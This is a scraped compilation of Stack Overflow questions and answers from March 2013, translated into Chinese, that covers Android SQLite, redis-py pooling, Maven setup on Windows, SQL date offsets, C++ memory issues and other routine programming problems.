        at dalvik.system.NativeStart.main(Native Method) 
```

最大的错误是我目前的主要舞会。我搜索并发现很多有类似问题的人，但没有一个解决方案适合我。我开始怀疑是否还有其他问题导致其他解决方案无法正常工作。

```
private static final String DATABASE_NAME = "letterwriter"; // Database Name
private static final int DATABASE_VERSION = 4; // Database Version  
private static final String TABLE_STUDENT = "studentTable";  // Student table name
private static final String TABLE_TEACHER = "teacherTable";  // Teacher table name
private static final String TABLE_RESULTS = "resultsTable";  // Results table name

//Student columns
private static final String KEY_sID = "studentId";
private static final String KEY_sSNAME = "studentSurname";
private static final String KEY_sFNAME = "studentForname";
private static final String KEY_sSCHOOL = "studentSchool";
private static final String KEY_t_ID = "teacherId";
private static final String KEY_t_SNAME = "teacherSurname";

//Teacher columns
private static final String KEY_tID = "teacherId";
//private static final String KEY_PW = "password";
private static final String KEY_tSNAME = "teacherSurname";
private static final String KEY_tFNAME = "teacherForename";
private static final String KEY_tSCHOOL = "teahcerSchool";

//Student columns
private static final String KEY_s_ID = "student id";
private static final String KEY_aRes = "A";
private static final String KEY_bRes = "B";
private static final String KEY_cRes = "C";
private static final String KEY_dRes = "D";
private static final String KEY_eRes = "E";
private static final String KEY_fRes = "F";
private static final String KEY_gRes = "G";
private static final String KEY_hRes = "H";
private static final String KEY_iRes = "I";
private static final String KEY_jRes = "J";
private static final String KEY_kRes = "K";
private static final String KEY_lRes = "L";
private static final String KEY_mRes = "M";
private static final String KEY_nRes = "N";
private static final String KEY_oRes = "O";
private static final String KEY_pRes = "P";
private static final String KEY_qRes = "Q";
private static final String KEY_rRes = "R";
private static final String KEY_sRes = "S";
private static final String KEY_tRes = "T";
private static final String KEY_uRes = "U";
private static final String KEY_vRes = "V";
private static final String KEY_wRes = "W";
private static final String KEY_xRes = "X";
private static final String KEY_yRes = "Y";
private static final String KEY_zRes = "Z";

private DbHelper dbHelp;
private final Context context;
private SQLiteDatabase dbase;

private class DbHelper extends SQLiteOpenHelper{

    public DbHelper(Context con){
        super(con, DATABASE_NAME, null, DATABASE_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {

        db.execSQL("CREATE TABLE IF NOT EXISTS " + TABLE_STUDENT + " (" +
               KEY_sID + " INTEGER, " + 
               KEY_sSNAME + " TEXT NOT NULL, " + 
               KEY_sFNAME + " TEXT NOT NULL, " +
               KEY_t_ID + " INTEGER, " +
               KEY_t_SNAME + " TEXT NOT NULL, " +
               "FOREIGN KEY (" + KEY_t_ID + ") REFERENCES " + 
               TABLE_TEACHER + " (" + KEY_tID + "), " +
               "FOREIGN KEY (" + KEY_t_SNAME + ") REFERENCES " + 
               TABLE_TEACHER + " (" + KEY_tID + "), " +
               "PRIMARY KEY (" + KEY_sID + ", " + KEY_sSNAME + ", " + KEY_sFNAME + "));"
        );

        db.execSQL("CREATE TABLE " + TABLE_TEACHER + " (" +
               KEY_tSNAME + " TEXT NOT NULL, " + 
               KEY_tFNAME + " TEXT NOT NULL, " + 
               KEY_tSCHOOL + " TEXT NOT NULL, " +
               "PRIMARY KEY (" + KEY_tSNAME + ", " + KEY_tFNAME + "));"
        );

        db.execSQL("CREATE TABLE " + TABLE_RESULTS + " (" +
               KEY_aRes + " TEXT, " + KEY_bRes + " TEXT, " +
               KEY_cRes + " TEXT, " + KEY_dRes + " TEXT, " +
               KEY_eRes + " TEXT, " + KEY_fRes + " TEXT, " +
               KEY_gRes + " TEXT, " + KEY_hRes + " TEXT, " +
               KEY_iRes + " TEXT, " + KEY_jRes + " TEXT, " +
               KEY_kRes + " TEXT, " + KEY_lRes + " TEXT, " +
               KEY_mRes + " TEXT, " + KEY_nRes + " TEXT, " +
               KEY_oRes + " TEXT, " + KEY_pRes + " TEXT, " +
               KEY_qRes + " TEXT, " + KEY_rRes + " TEXT, " +
               KEY_sRes + " TEXT, " + KEY_tRes + " TEXT, " +
               KEY_uRes + " TEXT, " + KEY_vRes + " TEXT, " +
               KEY_wRes + " TEXT, " + KEY_xRes + " TEXT, " +
               KEY_yRes + " TEXT, " + KEY_zRes + " TEXT);"
        );
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_STUDENT);
        onCreate(db);
    }

}

public Database(Context c) {
    context = c;
}

public Database openForWrite() throws SQLException {
    dbHelp = new DbHelper(context);
    dbase = dbHelp.getWritableDatabase();

    return this;
}

public Database openForRead() {
    dbHelp = new DbHelper(context);
    dbase = dbHelp.getReadableDatabase();

    return this;
}

public void close(){
    dbHelp.close();
}

long createStudentEntry(String f, String surname, String school ){
    ContentValues cv = new ContentValues();
    cv.put(KEY_sFNAME, f);
    cv.put(KEY_sSNAME, surname);
    cv.put(KEY_sSCHOOL, school);

    //find way to do insert where
    return dbase.insert(TABLE_STUDENT, null, cv);
}

//look into password issue
long createTeacherEntry(String forename, String surname, String school ){
    ContentValues cv = new ContentValues();
    cv.put(KEY_tFNAME, forename);
    cv.put(KEY_tSNAME, surname);
    cv.put(KEY_tSCHOOL, school);

    //find way to do insert where
    return dbase.insert(TABLE_TEACHER , null, cv);
}

long createResultEntry(String key, String result ){
    ContentValues cv = new ContentValues();
    cv.put(key, result); // may not work change later

    //find way to do insert where?
    return dbase.insert(TABLE_STUDENT , null, cv);
}

public String getData(){
    String [] columns = new String []{KEY_sFNAME, KEY_sSNAME, KEY_sSCHOOL};
    Cursor c = dbase.query(TABLE_STUDENT, columns, null, null, null, null, null);
    String queryRes = "";

    int sFName = c.getColumnIndex(KEY_sFNAME);
    int sSName = c.getColumnIndex(KEY_sSNAME);
    int sSCHOOL = c.getColumnIndex(KEY_sSCHOOL);

    for(c.moveToFirst(); !c.isAfterLast(); c.moveToNext()){
        queryRes = queryRes + c.getString(sFName) + " " + c.getString(sSName) + " " + c.getString(sSCHOOL) + "\n";
    }
    c.close();

    return queryRes;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:29:30.227

在您的`onCreate`方法中，在用于创建的 sql 字符串中，`TABLE_STUDENT`您没有声明一个名称与`KEY_sSCHOOL`您在`createStudentEntry`方法中使用的名称相对应的列。

Double check that sql string and insert that column and after, either increment the database version or reinstall the app.

# python - 如何使用 Python / Python RQ 正确处理 Redis 连接？

> ID：15392182
> 
> 赞同：7
> 
> 时间：2013-03-13T17:21:28.283
> 
> 标签：python, database, redis, database-connection

处理 Redis 连接的最佳模式是什么（通过 Python-RQ 直接和间接与 Redis 交互）？

通常，完成后数据库连接需要关闭/返回到池中，但我不知道如何使用 redis-py 来做到这一点。这让我怀疑我是不是做错了。

此外，在将作业排队到 RQ 时，我看到了一些性能下降，我被告知这可能与糟糕的连接使用/重用有关。

基本上，我有兴趣了解正确的模式，因此我可以验证或更正我们应用程序中的内容。

非常感谢！如果有更多有用的信息，请告诉我。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-15T13:20:46.200

在幕后，redis-py 使用连接池来管理与 Redis 服务器的连接。默认情况下，您创建的每个 Redis 实例都会依次创建自己的连接池。您可以通过将已创建的连接池实例传递给 Redis 类的 connection_pool 参数来覆盖此行为并使用现有的连接池。您可以选择执行此操作以实现客户端分片或对连接的管理方式进行更精细的控制

```
pool = redis.ConnectionPool(host='localhost', port=6379, db=0)
r = redis.Redis(connection_pool=pool) 
```

# android - 什么是 cvSVD 在 openCV for android 中的等价物

> ID：15392183
> 
> 赞同：0
> 
> 时间：2013-03-13T17:21:32.210
> 
> 标签：android, opencv, matrix

我在适用于 android 的 opencV 2.4.2 中找不到方法 cvSVD。任何人都可以帮助或给我一些想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T11:49:52.960

那没有。我需要自己编码。它产生矩阵的特征值和特征向量。对于任何担心的人，请在这里获得一些有效的 JavaScript 来帮助： [http ://www.akiti.ca/compRealEigSys.js](http://www.akiti.ca/compRealEigSys.js)

# ruby-on-rails - 具有图像拖放功能的所见即所得编辑器

> ID：15392184
> 
> 赞同：1
> 
> 时间：2013-03-13T17:21:44.650
> 
> 标签：ruby-on-rails, editor

我在哪里可以获得像 github.com 中使用的那样的 WYSIWYG 编辑器？我可以在发布消息时在编辑器上拖放图像。Chrome 中的 Gmail 编写器也有类似的功能。

顺便说一句，我是一名 Rails 开发人员。所以rails gem会加分。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:31:12.413

[SammyLin / redactor-rails](https://github.com/SammyLin/redactor-rails) gem 可以为您执行此操作，并结合上传 gem，例如carrierwave（所有在文档中进行了解释）。

# c - 丢弃现有的 printf 语句并启用新添加的 printf 语句

> ID：15392190
> 
> 赞同：1
> 
> 时间：2013-03-13T17:22:07.237
> 
> 标签：c

我有许多现有的 printf 语句，我想通过以下方式禁用：

```
#define printf(...) {}; 
```

但我想定义一个新的 myprintf 语句，它仍将使用 stdio printf。我该怎么做呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:23:07.563

采用：

```
#define myprintf (printf) 
```

括号将禁用宏扩展。

```
#include <stdio.h>

#define printf(...) do {} while(0)
#define myprintf (printf)

int main() {
  printf("printf\n");
  myprintf("myprintf\n");
} 
```

（并不是说我首先会推荐#defining `printf`...）

有关我使用`do {} while(0)`而不是的原因的解释`{}`，请参阅[Proper C preprocessor macro no-op](https://stackoverflow.com/questions/11549193/proper-c-preprocessor-macro-no-op)

# maven - 为 Windows 7 配置 Maven，Files\Java\jdk1.6.0_23"" 此时出现意外错误

> ID：15392191
> 
> 赞同：22
> 
> 时间：2013-03-13T17:22:09.857
> 
> 标签：maven, windows-7, configure

我正在尝试在我的 Win 7 机器上配置 Maven。我正在执行以下步骤： [http://maven.apache.org/download.cgi](http://maven.apache.org/download.cgi) 我将 Maven 下载到文件夹 c:\Program Files\Apache Software Foundation\apache-maven-3.0.5\

我按照上面 URL 中的描述设置了所有环境变量

```
JAVA_HOME = C:\Program Files\Java\jdk1.6.0_23
M2_HOME = c:\Program Files\Apache Software Foundation\apache-maven-3.0.5\
M2 = %M2_HOME%\bin
PATH = %M2%; C:\Program Files (x86)\SSH Communications Security\SSH Secure Shell;     %JAVA_HOME%\bin ; C:\Program Files\Java\jdk1.6.0_23 
```

但是当我输入： C:\Users\Andrei>mvn --version

我得到一个：

Files\Java\jdk1.6.0_23"" 此时出乎意料。

你能帮我解决这个问题吗？如果您需要更多详细信息，请告诉我。提前致谢！

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2013-05-30T01:25:02.403

这个为我解决了：[http ://www.xinotes.net/notes/note/559/](http://www.xinotes.net/notes/note/559/)

这是如何设置 JAVA_HOME 路径的问题。

设置不带引号的路径，如下所示：

```
set java_home=c:\Program Files\Java 
```

或者对文件夹名称使用 8 字符语法，如下所示：

```
set java_home="c:\Progra~1\Java" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-11-14T12:43:14.317

为了解决同样的问题

我做了：

```
SET M2_HOME=C:\Program Files\Apache Software Foundation\apache-maven-3.2.3-bin\apache-maven-3.2.3 
```

然后

```
SET JAVA_HOME=C:\Program Files (x86)\Java\jre7 
```

最后我添加到路径的开头

```
SET Path=%JAVA_HOME%\bin;%M2_HOME%\bin;... 
```

在退出所有正在运行的 cmd.exe 并打开一个新的之后，我可以毫无问题地执行*mvn --version*。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-07-13T12:14:04.843

我有同样的问题，但原因是 M2_HOME 变量定义为：

```
C:\apache-maven-3.2.2\bin 
```

代替

```
C:\apache-maven-3.2.2\ 
```

JAVA_HOME 也应该是 java 文件夹，而不是 \bin 子文件夹。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-12-17T11:58:55.643

我遇到了类似的问题，问题在于当前运行 maven 的目录路径中存在字符“（”，例如：- ***C:\Work(test)\Java-Project***。我只是将其更改为***C： \Work\Java-Project***及其现在工作正常。

有关信息，我正在使用 Maven V3.6.0 运行 Windows 10

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-16T18:03:59.943

我遇到过同样的问题。我没有为 M2_HOME 或 JAVA_HOME 的值加上引号，但仍然出现错误。

我将 %M2_HOME%\bin 和 %JAVA_HOME%\bin 移到了路径中，以便它们都发生在路径中的任何空格之前并且问题消失了。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-05-18T13:38:32.747

使用 windows GUI 环境变量配置 > 系统变量插入：名称 JAVA_HOME 路径 C:\Program Files (x86)\Java\jre7\ << 最后带有“\”。没有引号。

杀死进程 cmd.exe 并重新打开（如果已打开）。它对我有用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-12-11T03:29:59.273

> 错误消息：此时我在 cmd 中运行 mvn --version 命令时出现意外。

请查找程序：

我的电脑->右键属性->高级-环境变量-用户变量

**Maven 3.2.3**

```
User Variable :
Variable name :M2 
Variable Value : %M2_HOME%\bin
Variable name : M2_HOME
Variable Value :  C:\WLS1033\Apache Software Foundation\apache-maven-3.2.3
Variable name :path 
Variable Value : %M2_HOME%\bin 
```

结果 ：

```
D:\Documents and Settings\x169810>mvn --version
Apache Maven 3.2.3 (33f8c3e1027c3ddde99d3cdebad2656a31e8fdf4; 2014-08-11T16:58:10-04:00)
Maven home: C:\WLS1033\Apache Software Foundation\apache-maven-3.2.3
Java version: 1.6.0_18, vendor: Sun Microsystems Inc.
Java home: C:\WLS1033\jdk160_18\jre
Default locale: en_US, platform encoding: Cp1252
OS name: "windows xp", version: "5.1", arch: "x86", family: "windows" 
```

我的电脑->右键属性->高级-环境变量-用户变量

**Maven 1.0.2**

```
User Variable :
Variable name :M2 
Variable Value : %MAVEN_HOME%\bin
Variable name : MAVEN_HOME
Variable Value :  C:\WLS1033\Apache Software Foundation\maven-1.0.2
Variable name :path 
Variable Value : %MAVEN_HOME%\bin 
```

# sql - 修改 SQL 行以设置回退日期

> ID：15392203
> 
> 赞同：1
> 
> 时间：2013-03-13T17:22:40.810
> 
> 标签：sql

我目前正在运行一个 PHP 脚本，该脚本从 Facebook 获取数据并将其放入我的 SQL 数据库中。我现在希望能够查看在数据抓取后 2 小时内发布了哪些 Facebook 帖子，并且我意识到 NOW() 命令的时间比 Facebook 服务器的偏移量提前了 4 小时。

这给我带来了三个问题：

1）有没有办法执行一个选择命令，我可以将日期偏移 4 小时？

2) 有没有办法修改行以将日期偏移 4 小时？

3）这些方法是否真的会将整个日期设置回去，这样如果一个日期是今天（3月13日）的1:00，它将被修改为前一天（3月12日）的21:00。

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:24:27.630

在 SQL 中使用日期的任何地方，您都可以在选择、插入和 where 中使用 DATEADD 函数

```
 DATEADD(hour,4,datevalue) 
```

要返回只需使用负数

```
 DATEADD(hour,-4,datevalue) 
```

所以这

```
DECLARE @datetime datetime = '2013-03-13 01:01:01.110';
SELECT DATEADD(hour, -4, @datetime); 
```

返回这个：

```
2013-03-12 21:01:01.110 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:24:55.633

> 1）有没有办法执行一个选择命令，我可以将日期偏移 4 小时？

是的，使用`DATEADD`/`DATE_ADD`

> 2) 有没有办法修改行以将日期偏移 4 小时？

你不应该修改数据。

> 3）这些方法是否真的会将整个日期设置回去，这样如果一个日期是今天（3月13日）的1:00，它将被修改为前一天（3月12日）的21:00。

如果您正在使用`DATEADD`/`DATE_ADD`函数并且您的日期在一个`date`类型中，那么是的。

[SQL Server 手册](http://msdn.microsoft.com/en-us/library/ms186819.aspx)

[MySQL 手册](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html)

# javascript - 以编程方式修改工作灯适配器中的凭据

> ID：15392206
> 
> 赞同：0
> 
> 时间：2013-03-13T17:22:42.307
> 
> 标签：javascript, ibm-mobilefirst

我正在寻找一种以编程方式设置 HTTP 适配器凭据的方法？有人有例子吗？

是否可以修改适配器实现 js 以覆盖凭据？

有类似的东西：

```
function getMyAdapters(path) {

var tok = "myuser:mypw";
var hash = Base64Encoder.encode(tok);
var headers="{'User-Agent':'Mozilla'"+"Authentication: Basic }"+hash;
var input = {
        method : 'get',
        returnedContentType : 'json',
        headers: headers,
        path : path
    };

return WL.Server.invokeHttp(input);
} 
```

但它失败了，因为它没有找到 Base64Encoder。

任何的想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T08:52:37.710

首先，您应该使用“授权”而不是“身份验证”，如下所述：[http ://en.wikipedia.org/wiki/Basic_access_authentication](http://en.wikipedia.org/wiki/Basic_access_authentication)

此外，您应该执行以下操作：

创建一个 Java 类，如下所示（当然，您需要清理和调整它）：

```
public class Idan {
        public String basicHash(String user, String password) {
            BASE64Encoder base64Encoder = new BASE64Encoder();
            String authorization = user + ":" + password;
            return base64Encoder.encode(authorization.getBytes());
        }

        // to test:
        public static void main(String[] args) {
        Idan i = new Idan();
        System.out.println(i.basicHash("idan", "somepassword"));
    }
} 
```

在适配器的 .js 文件中，全局声明：

```
var idan = new org.Idan(); 
```

和程序：

```
function test(){
WL.Logger.debug(idan.basicHash("username_test", "secret_password")); 
```

}

# c# - 接口作为返回类型

> ID：15392224
> 
> 赞同：27
> 
> 时间：2013-03-13T17:23:18.313
> 
> 标签：c#, interface

接口可以是函数的返回类型。如果是，那有什么好处。例如，以下代码在返回接口数组的位置是否正确。

```
public interface Interface
{
    int Type { get; }
    string Name { get; }
}

public override Interface[] ShowValue(int a)
{
.
.

} 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-03-13T17:28:45.847

是的，您可以返回一个接口。

假设类`A`和`B`每个实现接口`Ic`：

```
public interface Ic
{
    int Type { get; }
    string Name { get; }
}

public class A : Ic
{
     .
     .
     .
}

public class B : Ic
     .
     .
     .
}

public Ic func(bool flag)
{
     if (flag)
         return new A();
       return new B();

} 
```

在这个例子`func`中就像工厂方法——它可以返回不同的对象！

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-03-13T17:27:56.080

是的 an`interface`是一个非常有效的返回值。请记住，您返回的不是接口的定义，而是该接口的一个***实例***。

好处很明显，考虑下面的代码：

```
public interface ICar
{
    string Make { get; }
}

public class Malibu : ICar
{
    public string Make { get { return "Chevrolet"; } }
}

public class Mustang : ICar
{
    public string Make { get { return "Ford"; } }
} 
```

`ICar`现在您可以返回许多具有各自值的不同实例。

但是，使用接口的主要原因是它们可以在众所周知的合同中在程序集之间共享，这样当你传递给某人时`ICar`，他们对它一无所知，但他们知道它有一个`Make`. 此外，除了公共接口之外，他们无法对其执行任何操作。因此，如果`Mustang`有一个`public`名为的成员`Model`，除非它在界面中，否则他们无法访问。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-03-13T17:27:18.313

是的，它可以。

好处是您可以抽象返回（和输入）类型。

```
public interface IFruit{ }

public class Apple: IFruit{}

public class Pear: IFruit{}

...

public function IFruit SelectRandomFromBasket(Basket<IFruit> basket){
  // this function can return Apple, Pear
} 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-03-13T17:27:53.190

是的，这是可能的，这对公共职能来说是件好事。

对于您问题的**为什么**部分，我不会复制粘贴其他人的答案，因此请参考现有答案，例如：

*   [列表<T> 或 IList<T>](https://stackoverflow.com/questions/400135/c-sharp-listt-or-ilistt)
*   [方法返回一个接口](https://stackoverflow.com/questions/511248/method-return-an-interface)
*   [https://stackoverflow.com/a/3564291/870604](https://stackoverflow.com/a/3564291/870604)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-09-28T07:24:45.783

是的，我将从 golang 的角度回答您的问题，我们可以使用接口作为返回类型，这意味着您可以返回任何数据类型，例如 int、float、string 等。

接口 = 任何数据类型

```
package main

import (
    "fmt"
)

func any (u interface{}) interface{} {
    fmt.Printf("Type: %T\n",u)
    return u
}

func main(){
    fmt.Println("value: ",any(5))
    fmt.Println(any("testing"))
} 
```

[输出](https://i.stack.imgur.com/ELbao.png)

# hadoop - Hadoop jobtracker HA 版本 1.1.2

> ID：15392230
> 
> 赞同：0
> 
> 时间：2013-03-13T17:23:37.863
> 
> 标签：hadoop

是否可以使用版本 1.1.2 的社区 hadoop 分发配置 hadoop jobtracker 高可用性？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T05:01:10.060

您无法获得真正的 HA 解决方案（将分发切换到 MapR 除外），但在作业完成持久性的帮助下，您可以实现某种目的。[https://issues.apache.org/jira/browse/HADOOP-3245](https://issues.apache.org/jira/browse/HADOOP-3245)这个解决方案可以帮助 JT 容忍重启。

# android - android：在服务中获取运动传感器

> ID：15392238
> 
> 赞同：1
> 
> 时间：2013-03-13T17:24:04.807
> 
> 标签：android, service, sensors

我需要在我`ScheduledThreadPoolExecutor()`用来经常启动某些方法的服务中获取运动（由传感器发送）。

为了更清楚，我需要在后台了解设备的移动。

问题是从这个方法中需要注册MovementListener，这似乎是不可能的，因为这个方法本身是在服务中启动的，服务不能有一个`looper`所以不能接收消息？

你有解决方案吗？

谢谢！

# lucene - 查询时忽略字段

> ID：15392239
> 
> 赞同：0
> 
> 时间：2013-03-13T17:24:04.817
> 
> 标签：lucene, elasticsearch

我有以下文件

```
{ 
  "authors" : "Nanna Friis",
  "authorsId" : [ "4642" ],
  "description" : "Med denne praktiske og pædagogiske håndbog kommer du hele vejen     rundt om at skrive godt til nettet. Du bliver taget ved hånden og får en grundig gennemgang af de helt særlige præmisser, der hersker på nettet. ",
  "iSBN" : "9788762904118",
  "mediaType" : "10",
  "name" : "Kort, klart og klikbart",
  "nameSort" : "Kort, klart og klikbart",
  "price" : 250.0,
  "productId" : "9788762904118",
  "publicationAreaCode" : "3077",
  "tags" : [  ],
  "titleId" : "25004"
} 
```

进行这样的查询时，`http://localhost:9200/titles/_search?q=Nanna*`我没有得到任何结果。如果我改为查询 ie。像这样的productId`http://localhost:9200/titles/_search?q=9788762904118`我得到了有问题的文件。

到底是怎么回事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:40:55.143

您没有在请求中指定查询字段

在这种情况下，您将搜索[默认搜索字段](http://www.elasticsearch.org/guide/reference/query-dsl/query-string-query.html)

> 当未在查询字符串语法中明确指定要搜索的字段时，index.query.default_field 将用于派生要搜索的字段。它默认为 _all 字段。
> 
> 因此，如果 _all 字段被禁用，更改它以设置不同的默认字段可能是有意义的。

# c++ - 向数组添加维度

> ID：15392241
> 
> 赞同：0
> 
> 时间：2013-03-13T17:24:11.780
> 
> 标签：c++, matrix, multidimensional-array

是否可以在 C++ 中向现有数组添加一维或多维？例如，我有一个二维数组，在某个地方我需要向这个数组添加一个或多个维度。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:46:59.390

无论如何，正如 poitroae 已经提到的，您将需要某种副本。但是，如果您使用 1-D 数组模拟 2-D 和 3-D 数组，则此副本会大大加快速度，这就是我决定首先发布答案的原因。

为了使用 1-D 数组模拟 2-D 和 3-D 数组，您可以使用简单的数学来索引数组。这降低了内存分段，使其更快，因为有更多的 chache 命中。要添加维度，您只需创建另一个具有适当大小的一维数组，然后复制当前数据。

当我可以找到执行此操作的代码时，我将提供一个示例。

**编辑：显然以上不是他想要的。我会在下面再试一次**

你有：一个模拟二维数组的一维数组。

似乎您不想实际将整个维度添加到数组中，而只是矩阵。（基本上在保留数据的同时从一种尺寸调整到另一种尺寸）

所以，这里有一个例子：

您在下面有一个 3x3 (U=3, V=3) 矩阵

逻辑表示：

```
|3 5 6|
|7 2 5|
|1 0 2| 
```

物理表示（int[3*3]“矩阵”）

```
[3, 5, 6, 7, 2, 5, 1, 0, 2] 
```

**--转换为 4x4(X = 4, Y = 4)--**

```
int* newMatrix = new int[X*Y];
for(int i = 0; i < Y; i++)
{
    for(int k = 0; k < X; k++)
    {
        //copy from old if it falls in bounds
        if(k < U && i < V)
        {
            newMatrix[i*X + k] = matrix[i*U + k];
        }
        //Otherwise, zero out
        else
        {
            newMatrix[i*X + k] = 0;
        }
    }
}
delete [] matrix; 
```

那应该给你一个 4x4 newMatrix。

逻辑上：

```
|3 5 6 0|
|7 2 5 0|
|1 0 2 0|
|0 0 0 0| 
```

物理上：

```
[3, 5, 6, 0, 7, 2, 5, 0, 1, 0, 2, 0, 0, 0, 0, 0,] 
```

如果你像我一样使用变量，你应该能够编写一个函数，只要你给它准确的参数（矩阵的 X 和 Y 维度），它就可以对任何矩阵执行此操作

换一种方式——缩小尺寸——它应该是一个类似的设置（双循环），你检查你是否在界限内，只有当你在时才复制。如果没有，你根本不复制任何东西。我会让你写那个。

我希望这是您正在寻找的更多内容。我在错误的上下文中跳跃维度。决定更多地用矩阵来思考答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:25:27.703

您不能隐式执行此操作。您必须**创建一个新的 n 维数组并复制所需的值**

```
int new_array[10][10][10];

// copy using a loop or a std::-function 
```

# playframework - 在播放框架 1.2.5 中，扩展作业运行后台阻止请求/响应的类

> ID：15392245
> 
> 赞同：1
> 
> 时间：2013-03-13T17:24:21.873
> 
> 标签：playframework, playframework-2.0, jobs, playframework-1.x, job-scheduling

我是使用游戏框架的新手，我需要每天运行一段代码，而不影响游戏的请求/响应周期！我在`Job`游戏课上做了这个，`Job`运行时间只有半小时多一点。运行我的 play 应用程序后，我意识到`Job`运行时 play 不接受任何请求。我的控制器中的方法在`Job`完成任务后做出响应。所以这意味着它正在阻止它们。我在等你的建议。

```
import parser.Parser;
import parser.ProductModel;
import play.jobs.Every;
import play.jobs.Job;
import play.jobs.OnApplicationStart;

@OnApplicationStart
@Every("24h")
public class ParserJob extends Job {
//private Parser parser=new Parser();
@Override
public void doJob() throws Exception {
    Parser parser=new Parser();
        long start=System.currentTimeMillis();
        parser.firsatBuFirsat("http://www.firsatbufirsat.com/");
        long finish = System.currentTimeMillis();
        System.out.println("TIME : "+(finish-start)/1000);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T20:04:24.837

更改`@OnApplicationStart`为`OnApplicationStart(async = true)`

# php - 在屏幕中心显示 HTML 表格

> ID：15392247
> 
> 赞同：-3
> 
> 时间：2013-03-13T17:24:23.040
> 
> 标签：php, html, css

在屏幕中央优雅地显示此表时遇到问题。请指教？

网页链接粘贴在下面：

[http://www.technicaldebt.co.uk/fyp/prototype/databasetest.php](http://www.technicaldebt.co.uk/fyp/prototype/databasetest.php)

任何帮助是极大的赞赏。

```
<table border="5" cellspacing="2" cellpadding="2">
<tr>
<td><font face="Arial, Helvetica, sans-serif">Title</font></td>
<td><font face="Arial, Helvetica, sans-serif">First Name</font></td> 
<td><font face="Arial, Helvetica, sans-serif">Last Name</font></td>
<td><font face="Arial, Helvetica, sans-serif">E-mail Address</font></td>
<td><font face="Arial, Helvetica, sans-serif">Project Title</font></td>
</tr>

<?php
$i=0;
while ($i < $num) {

$f1=mysql_result($result,$i,"Titles");
$f2=mysql_result($result,$i,"FirstName");
$f3=mysql_result($result,$i,"LastName");
$f4=mysql_result($result,$i,"Email");
$f5=mysql_result($result,$i,"ProjectRoles");
?>

<tr>
<td><font face="Arial, Helvetica, sans-serif"><?php echo $f1; ?></font></td>
<td><font face="Arial, Helvetica, sans-serif"><?php echo $f2; ?></font></td>
<td><font face="Arial, Helvetica, sans-serif"><?php echo $f3; ?></font></td>
<td><font face="Arial, Helvetica, sans-serif"><?php echo $f4; ?></font></td>
<td><font face="Arial, Helvetica, sans-serif"><?php echo $f5; ?></font></td>
</tr>

<?php
$i++;
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:02:19.670

不是专门的答案，但我想（？）我太初级了，不能写评论而不是“答案”......

*   至少在问题中，你仍然失踪`</table>`

*   @jeroen 正在谈论 CSS - 进入或您`<style type="text/css">css here</style>`的`<head>`外部样式表之一。

*   当您使用它时，您可以`<font>`使用 CSS 修剪重复的标签

    `td {font-family: Arial, Helvetica, sans-serif;}`

*   任何查看您的链接的人现在都拥有技术债务团队几名成员的电子邮件地址。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:33:49.667

`style="margin: 0 auto"`在表格开始标签内添加

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:31:04.590

只需添加：

```
table {
    margin: auto;
    min-width: 80%;    // or whatever you like
} 
```

# c++ - 内存泄漏，向量推回 C++

> ID：15392248
> 
> 赞同：0
> 
> 时间：2013-03-13T17:24:24.073
> 
> 标签：c++, memory, vector, memory-leaks, heap-memory

我有一个类`Bar`，它的构造函数初始化一个`std::vector`类型`Foo`（另一个类）。

条形图.cpp

```
Bar::Bar(int n) {
 for(int i = 0; i < n; i++) {
    Foo foo;
    foo.somefunction(i);
    vec.push_back(foo) //this should insert foo into the vector
  }
} 
```

酒吧.h

```
class Foo;
class Bar {
 std::vector<Foo> vec;
}; 
```

当我调试时，构造的第一次迭代工作正常。`foo`被创建，`foo.somefunction()`运行良好，并`foo`被推入`vec`.

第二次迭代似乎也可以正常工作，但是程序在返回开始第三次迭代时崩溃。

我得到`_BLOCK_TYPE_IS_VALID(pHead->nBlockUse)`错误和`HEAP CORRUPTION DETECTED`.

`Foo`是一个包含动态创建数组的类，没什么特别的。像这样的东西：

```
Foo::Foo() {
  solution = new float[size];
  // some function that initializes the elements of solution
} 
```

和一个常规的析构函数`~Foo() {delete [] solution;}`。我不认为问题来自`Foo`.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:26:46.377

很可能您没有正确实施`copy constructor`and`operator =`并且您正在双重删除`solution`. 如前所述，您还应该阅读[The Rule of Three](https://stackoverflow.com/questions/4172722/what-is-the-rule-of-three)。

C++ 标准容器[存储副本](https://stackoverflow.com/a/2100295/1708801)，因此当您执行 a 时，`push_back`您正在制作副本。

* * *

## 回答 #2

